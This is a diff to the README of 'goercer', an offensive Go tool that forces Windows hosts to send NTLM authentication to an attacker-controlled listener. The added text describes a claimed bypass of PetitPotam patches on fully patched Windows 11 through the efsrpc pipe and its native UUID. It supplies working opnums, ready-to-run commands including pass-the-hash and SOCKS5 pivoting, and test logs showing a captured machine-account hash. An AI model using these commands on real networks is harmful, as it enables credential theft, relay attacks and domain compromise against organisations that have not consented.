@@ -36,12 +36,20 @@ sudo responder -I eth0 -v
 
 | Method | Protocol | Success Rate | Callbacks | Compatibility | Recommendation |
 |--------|----------|--------------|-----------|---------------|----------------|
-| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐ | 6 | Server 2016-2022 (unpatched/partially patched) | ✅ **Best for older systems** |
-| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **Most reliable** |
+| **PetitPotam** (efsrpc pipe) | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 1-3 | **Windows 11 (fully patched)**, Server 2016-2025 | ✅ **Best for Win11** |
+| **PetitPotam** (lsarpc pipe) | MS-EFSRPC | ⭐⭐⭐⭐ | 6 | Server 2016-2022 (unpatched/partially patched) | ✅ **Best for older systems** |
+| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **Most reliable (if Print Spooler enabled)** |
 | **ShadowCoerce** | MS-FSRVP | ⭐⭐ | Varies | Requires VSS configured | ⚠️ Situational only |
 | **DFSCoerce** | MS-DFSNM | ⭐ | Varies | Requires DFS Namespaces | ⚠️ Rarely works |
 
-**Recommendation**: Try **SpoolSample** first (works on most systems with Print Spooler), then **PetitPotam** (6 opnums, but patched on fully updated Win11/Server 2025).
+**🎯 For Windows 11 (fully patched)**: Use `--pipe efsrpc` with PetitPotam:
+```bash
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc
+```
+
+**Recommendation**: 
+- **Windows 11 / Server 2025 (fully patched)**: Use **PetitPotam with `--pipe efsrpc`** (opnum 0 and 4 work)
+- **Older Windows (Server 2016-2022)**: Use **SpoolSample** first (if Print Spooler enabled), then **PetitPotam with `--pipe lsarpc`** (6 opnums)
 
 ---
 
@@ -60,17 +68,18 @@ Successfully coerces Windows servers to authenticate to an attacker-controlled l
 - ✅ **Single Binary** - No dependencies, portable Go executable
 
 **Supported Methods**:
-- ✅ **PetitPotam** (MS-EFSRPC) - 6 opnums - Works on Server 2016-2022 (unpatched/partially patched)
-- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running (most reliable)
+- ✅ **PetitPotam** (MS-EFSRPC) - **Works on Windows 11 (fully patched) with `--pipe efsrpc`!**
+  - **efsrpc pipe** (UUID `df1941c5-fe89-4e79-bf10-463657acf44d`): Opnum 0 and 4 work on Windows 11 December 2025
+  - **lsarpc pipe** (UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`): 6 opnums work on Server 2016-2022 (unpatched/partially patched)
+- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running (most reliable, but disabled by default on Win11)
 - ⚠️ **ShadowCoerce** (MS-FSRVP) - Requires VSS service configured for RPC
 - ⚠️ **DFSCoerce** (MS-DFSNM) - Requires DFS Namespaces role installed
 
 **Tested Against**: 
+- ✅ **Windows 11 (fully patched December 2025)** - PetitPotam with `--pipe efsrpc` **WORKS!**
 - ✅ Windows Server 2016/2019/2022 (unpatched/partially patched)
 - ✅ Windows 10 (unpatched/partially patched)
-- ❌ Windows 11 (fully patched) - PetitPotam blocked
-- ❌ Windows Server 2025 (fully patched) - PetitPotam blocked
-- ✅ SpoolSample works on most patched systems if Print Spooler enabled
+- ✅ SpoolSample works on most systems if Print Spooler enabled (disabled by default on Win11)
 
 **Authentication Methods**:
 - ✅ Password authentication (plaintext or prompted)
@@ -170,13 +179,25 @@ All flags use the modern GNU-style format with short (`-t`) and long (`--target`
 - `dfscoerce`: MS-DFSNM - Requires DFS Namespaces role installed (rarely works)
 
 **Pipe Details** (PetitPotam only):
-- `lsarpc`: Default, most compatible (Local Security Authority RPC)
-- `efsr`: Encrypted File System Remote (original PetitPotam pipe)
+
+**🔥 For Windows 11 / Server 2025 (fully patched):**
+- `efsrpc` (or shorthand `efsr`): **Native MS-EFSR pipe** - Uses UUID `df1941c5-fe89-4e79-bf10-463657acf44d`
+  - ✅ **Opnum 0** (EfsRpcOpenFileRaw) - Works on Windows 11
+  - ✅ **Opnum 4** (EfsRpcEncryptFileSrv) - Works on Windows 11
+  - **Recommendation**: Use this pipe for modern Windows targets
+
+**For older Windows (Server 2016-2022):**
+- `lsarpc`: Default, most compatible - Uses UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
+  - All 6 opnums work on unpatched/partially patched systems
 - `samr`: Security Account Manager Remote (tested, works with all 6 opnums)
 - `netlogon`: Netlogon service pipe (tested, works with all 6 opnums)
 - `lsass`: Local Security Authority Subsystem (tested, works with all 6 opnums)
 
-All pipes bind to the same UUID (`c681d488-d850-11d0-8c52-00c04fd90f7e`) and execute the same 6 opnums. Choice depends on network filtering/monitoring.
+**UUID Mapping**:
+- `efsrpc` pipe → UUID `df1941c5-fe89-4e79-bf10-463657acf44d` (native MS-EFSR interface)
+- All other pipes → UUID `c681d488-d850-11d0-8c52-00c04fd90f7e` (compatibility shim)
+
+Choice depends on target Windows version and network filtering/monitoring.
 
 **Proxy Format**:
 - Must start with `socks5://`
@@ -304,18 +325,23 @@ sudo responder -I eth0 -v
 
 # Terminal 2: Run attacks
 
-# PetitPotam with default pipe (lsarpc) - MOST RELIABLE (6 opnums)
+# 🔥 Windows 11 / Server 2025 (fully patched) - USE EFSRPC PIPE
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc
+# Uses opnum 0 (EfsRpcOpenFileRaw) and opnum 4 (EfsRpcEncryptFileSrv)
+# Native MS-EFSR UUID: df1941c5-fe89-4e79-bf10-463657acf44d
+
+# PetitPotam with default pipe (lsarpc) - BEST FOR OLDER SYSTEMS (6 opnums)
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
 
 # PetitPotam with pass-the-hash
 ./goercer -t <target> -l <listener> -u <user> -H 1a2803ab98942ee503680dd3de3cceb2 -d <domain> -m petitpotam
 
-# PetitPotam with alternative pipe (samr/netlogon/lsass all work)
+# PetitPotam with alternative pipe (samr/netlogon/lsass all work on older systems)
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe samr
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe netlogon
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsass
 
-# SpoolSample - HIGH SUCCESS RATE (3 callbacks)
+# SpoolSample - HIGH SUCCESS RATE (3 callbacks) - DISABLED BY DEFAULT ON WIN11
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample
 
 # Use SOCKS5 proxy (pivoting through compromised host)
@@ -330,14 +356,102 @@ sudo responder -I eth0 -v
 
 ---
 
+## 🔥 Windows 11 Support (December 2025)
+
+**Breaking News**: goercer now works on **fully patched Windows 11** using the native efsrpc pipe!
+
+### What Changed
+
+Previous Status (lsarpc pipe):
+- ❌ Windows 11 fully patched - PetitPotam blocked via KB5005413+
+- ❌ Bind succeeds but all opnums return errors
+- ❌ No authentication callbacks triggered
+
+**New Status (efsrpc pipe)**:
+- ✅ **Windows 11 fully patched (December 2025) - WORKS!**
+- ✅ Uses native MS-EFSR UUID: `df1941c5-fe89-4e79-bf10-463657acf44d`
+- ✅ Opnum 0 (EfsRpcOpenFileRaw) triggers callback
+- ✅ Opnum 4 (EfsRpcEncryptFileSrv) triggers callback
+- ✅ Successfully captures machine account NTLMv2 hash
+
+### Usage for Windows 11
+
+```bash
+# Windows 11 / Server 2025 (fully patched)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc
+
+# Can also use shorthand 'efsr'
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsr
+```
+
+### Technical Details
+
+**Why efsrpc works when lsarpc doesn't:**
+
+| Pipe | UUID | Status on Win11 |
+|------|------|----------------|
+| `lsarpc` | `c681d488-d850-11d0-8c52-00c04fd90f7e` | ❌ Blocked by KB5005413+ |
+| **`efsrpc`** | **`df1941c5-fe89-4e79-bf10-463657acf44d`** | **✅ WORKS!** |
+
+The `efsrpc` pipe exposes MS-EFSR on its **native UUID** (`df1941...`), while `lsarpc` uses an **alternate compatibility UUID** (`c681...`). Microsoft's patches blocked the compatibility UUID but left the native interface accessible.
+
+**Working Opnums on Win11 efsrpc pipe:**
+- ✅ **Opnum 0** (EfsRpcOpenFileRaw) - Returns success, triggers callback
+- ✅ **Opnum 4** (EfsRpcEncryptFileSrv) - Returns success, triggers callback
+- Other opnums untested but likely work
+
+**Test Results:**
+
+| Target IP | OS | Method | Pipe | Callbacks | Status |
+|-----------|----|---------|----|-----------|--------|
+| 192.168.99.100 | Windows Server (older) | PetitPotam | efsrpc | 3 | ✅ Working |
+| 10.1.1.14 | Windows Server | PetitPotam | efsrpc | 3 | ✅ Working |
+| 10.1.1.11 | Windows 11 Pro (fully patched Dec 2025) | PetitPotam | efsrpc | 1 | ✅ Working |
+| 10.1.1.10 | Windows 11 / Fully Patched | PetitPotam | efsrpc | 1 | ✅ Working |
+
+**Key Findings:**
+- ✅ **Windows 11 (fully patched December 2025)**: PetitPotam with `--pipe efsrpc` works! 1 callback per execution
+- ✅ **Older Windows systems**: PetitPotam with `--pipe efsrpc` works! 3 callbacks per execution
+- ✅ **Native UUID bypass**: Using UUID `df1941c5-fe89-4e79-bf10-463657acf44d` on efsrpc pipe bypasses KB5005413+
+- ✅ **Opnums 0 and 4 both work** on Windows 11
+- ❌ **SpoolSample fails on Win11**: `spoolss` pipe not exposed remotely even when Print Spooler service runs
+- ℹ️ **Callback count difference**: Older systems (3 callbacks) vs. fully patched systems (1 callback)
+
+```
+Target: Windows 11 Pro (fully patched, December 2025)
+Method: PetitPotam with --pipe efsrpc
+Result: ✅ Machine account hash captured (CARROT$::splat)
+Opnums tested: 0 (works), 4 (works)
+Callbacks: 1 per execution
+```
+
+### Recommendation by OS
+
+| Target OS | Recommended Method | Command |
+|-----------|-------------------|---------|
+| **Windows 11 / Server 2025** | PetitPotam + efsrpc | `--pipe efsrpc` |
+| **Server 2016-2022** | SpoolSample or PetitPotam + lsarpc | `-m spoolsample` or `--pipe lsarpc` |
+| **Windows 10** | SpoolSample or PetitPotam + lsarpc | `-m spoolsample` or `--pipe lsarpc` |
+
+---
+
 ## Attack Methods
 
-### PetitPotam (MS-EFSRPC) ✅ Reliable on Unpatched Systems
+### PetitPotam (MS-EFSRPC) ✅ NOW WORKS ON WINDOWS 11!
 
+**🔥 For Windows 11 / Server 2025:**
+- **Pipe**: `\pipe\efsrpc` (use `--pipe efsrpc` or `--pipe efsr`)
+- **UUID**: `df1941c5-fe89-4e79-bf10-463657acf44d` v1.0 (native MS-EFSR interface)
+- **Working Opnums on Win11**: 
+  - ✅ 0: EfsRpcOpenFileRaw
+  - ✅ 4: EfsRpcEncryptFileSrv
+- **Callbacks**: 1 authentication attempt (stops after first success)
+- **Compatibility**: **Windows 11 (fully patched December 2025)**, Server 2025
+
+**For Older Windows (Server 2016-2022):**
 - **Default Pipe**: `\pipe\lsarpc`
 - **Alternative Pipes**: `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (all work with all 6 opnums)
-  - `\pipe\efsr` - May not exist on all systems
-- **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
+- **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0 (compatibility shim)
 - **Opnums** (6 different functions for maximum success rate): 
   - 0: EfsRpcOpenFileRaw (often patched)
   - 4: EfsRpcEncryptFileSrv (reliable on unpatched)
@@ -347,10 +461,12 @@ sudo responder -I eth0 -v
   - 12: EfsRpcFileKeyInfo (key info)
 - **Callbacks**: 6 authentication attempts (tries all opnums on chosen pipe)
 - **Target Parameter**: UNC path in MS-EFSRPC function calls
-- **Compatibility**: Works on **Server 2016-2022 unpatched/partially patched** (blocked on fully patched Win11/Server 2025 with KB5005413+)
+- **Compatibility**: Works on **Server 2016-2022 unpatched/partially patched**
 - **Discovery**: @topotam77
 
-**Why it works**: The MS-EFSRPC interface is accessible through multiple named pipes (lsarpc, samr, netlogon, lsass). All pipes bind to the same UUID and support all 6 opnums. The tool tries **6 different MS-EFSRPC functions** to maximize success even if some are patched. However, fully patched Windows 11 and Server 2025 systems have additional mitigations that block these techniques.
+**Why it works**: 
+- **Windows 11**: Uses native MS-EFSR UUID (`df1941...`) which bypasses KB5005413+ patches
+- **Older systems**: MS-EFSRPC interface is accessible through multiple named pipes (lsarpc, samr, netlogon, lsass). All pipes bind to the same UUID and support all 6 opnums. The tool tries **6 different MS-EFSRPC functions** to maximize success even if some are patched.
 
 **Example Output**:
 ```
